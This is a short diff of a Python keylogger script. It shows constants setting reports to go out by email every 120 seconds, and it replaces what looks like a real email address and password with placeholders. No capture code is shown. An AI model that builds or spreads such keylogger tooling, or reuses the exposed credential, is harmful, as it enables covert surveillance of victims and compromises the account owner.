@@ -14,8 +14,8 @@ from datetime import datetime
 
 # Constants
 SEND_REPORTS_EVERY = 120
-EMAIL_ADDRESS = "mathopotamus@bearcreek.family"
-EMAIL_PASSWORD = "hippoLover77"
+EMAIL_ADDRESS = "email@example.com"
+EMAIL_PASSWORD = "password"
 
 class Keylogger:
     def __init__(self, interval:int, report_method:str="email"):
